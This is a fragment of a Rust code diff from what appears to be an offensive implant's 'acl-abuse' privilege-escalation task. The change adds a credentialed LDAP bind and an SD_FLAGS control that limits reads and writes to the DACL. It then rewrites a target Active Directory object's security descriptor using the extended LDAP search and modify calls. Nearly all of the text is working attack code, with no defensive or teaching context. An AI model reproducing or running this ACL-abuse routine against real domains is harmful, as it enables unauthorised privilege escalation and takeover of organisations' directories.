     let ver: u32 = 3;
     unsafe { fn_setopt(ld, 0x11, &ver as *const u32 as *const u8) };
-    let br = unsafe { fn_bind(ld, core::ptr::null(), core::ptr::null(), 0x0486) };
+    let user_b: Vec<u8> = match bind_user.as_deref() { Some(u) => u.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let pass_b: Vec<u8> = match bind_pass.as_deref() { Some(p) => p.bytes().chain(core::iter::once(0u8)).collect(), None => vec![0u8] };
+    let (u_ptr, p_ptr, auth_meth): (*const u8, *const u8, u32) = if bind_user.is_some() {
+        (user_b.as_ptr(), pass_b.as_ptr(), 0x80)
+    } else {
+        (core::ptr::null(), core::ptr::null(), 0x0486)
+    };
+    let br = unsafe { fn_bind(ld, u_ptr, p_ptr, auth_meth) };
     if br != 0 {
         unsafe { fn_unbind(ld) };
         return TaskOutput::failure(&format!("acl-abuse: ldap_bind: {br:#x}"));
     }
+
+    // Build SD_FLAGS control (DACL_SECURITY_INFORMATION=4) for explicit use in search and modify.
+    // LDAPControl x64: oid_ptr(8)+bv_len(4)+pad(4)+bv_val_ptr(8)+iscritical(4)+pad(4) = 32 bytes
+    let sd_oid: Vec<u8> = b"1.2.840.113556.1.4.801\0".to_vec();
+    let sd_ber: Vec<u8> = vec![0x30, 0x03, 0x02, 0x01, 0x04];
+    let mut ldap_ctrl = [0u8; 32];
+    unsafe {
+        *(ldap_ctrl.as_mut_ptr() as *mut *const u8)             = sd_oid.as_ptr();
+        *(ldap_ctrl.as_mut_ptr().add(8)  as *mut u32)           = sd_ber.len() as u32;
+        *(ldap_ctrl.as_mut_ptr().add(16) as *mut *const u8)     = sd_ber.as_ptr();
+        *(ldap_ctrl.as_mut_ptr().add(24) as *mut u32)           = 1;
+    }
+    let sdctls: [*const u8; 2] = [ldap_ctrl.as_ptr(), core::ptr::null()];
 
     let filter   = format!("(|(cn={target})(sAMAccountName={target})(distinguishedName={target}))");
     let filter_b: Vec<u8> = filter.bytes().chain(core::iter::once(0u8)).collect();
@@ -2173,8 +2324,10 @@ fn priv_acl_abuse(v: &serde_json::Value) -> TaskOutput {
 
     let mut res_msg: *mut u8 = core::ptr::null_mut();
     let sr = unsafe {
-        fn_search(ld, base_b.as_ptr(), 2, filter_b.as_ptr(),
-                  attr_ptrs.as_ptr(), 0, &mut res_msg)
+        fn_search_ext(ld, base_b.as_ptr(), 2, filter_b.as_ptr(), attr_ptrs.as_ptr(), 0,
+                      sdctls.as_ptr() as *const *const u8,
+                      core::ptr::null::<*const u8>() as *const *const u8,
+                      core::ptr::null::<u8>(), 0, &mut res_msg)
     };
     if sr != 0 {
         unsafe { fn_unbind(ld) };
@@ -2257,22 +2410,26 @@ fn priv_acl_abuse(v: &serde_json::Value) -> TaskOutput {
         };
     }
 
-    // Write back modified SD: LDAP_MOD_REPLACE | LDAP_MOD_BVALUES
+    // Write back modified SD with explicit SD_FLAGS=DACL control on the modify operation.
     let dn_b: Vec<u8> = target_dn.bytes().chain(core::iter::once(0u8)).collect();
     let mut berval = vec![0u8; 16];
     unsafe {
-        *(berval.as_mut_ptr() as *mut u32)                         = sd.len() as u32;
-        *((berval.as_mut_ptr().add(8)) as *mut *const u8)          = sd.as_ptr();
+        *(berval.as_mut_ptr() as *mut u32)               = sd.len() as u32;
+        *((berval.as_mut_ptr().add(8)) as *mut *const u8) = sd.as_ptr();
     }
     let bvals_arr: [*const u8; 2] = [berval.as_ptr(), core::ptr::null()];
     let mut ldap_mod = [0u8; 24];
     unsafe {
-        *(ldap_mod.as_mut_ptr() as *mut u32)                              = 2u32 | 0x8000u32;
-        *((ldap_mod.as_mut_ptr().add(8))  as *mut *const u8)              = attr_sd.as_ptr();
-        *((ldap_mod.as_mut_ptr().add(16)) as *mut *const *const u8)       = bvals_arr.as_ptr();
+        *(ldap_mod.as_mut_ptr() as *mut u32)                        = 2u32 | 0x80u32;
+        *((ldap_mod.as_mut_ptr().add(8))  as *mut *const u8)        = attr_sd.as_ptr();
+        *((ldap_mod.as_mut_ptr().add(16)) as *mut *const *const u8) = bvals_arr.as_ptr();
     }
     let mods_arr: [*const u8; 2] = [ldap_mod.as_ptr(), core::ptr::null()];
-    let mr = unsafe { fn_modify(ld, dn_b.as_ptr(), mods_arr.as_ptr()) };
+    let mr = unsafe {
+        fn_modify_ext(ld, dn_b.as_ptr(), mods_arr.as_ptr(),
+                      sdctls.as_ptr() as *const *const u8,
+                      core::ptr::null::<*const u8>() as *const *const u8)
+    };
     unsafe { fn_unbind(ld) };
     if mr != 0 {
         return TaskOutput::failure(&format!("acl-abuse: ldap_modify_s: {mr:#x}"));
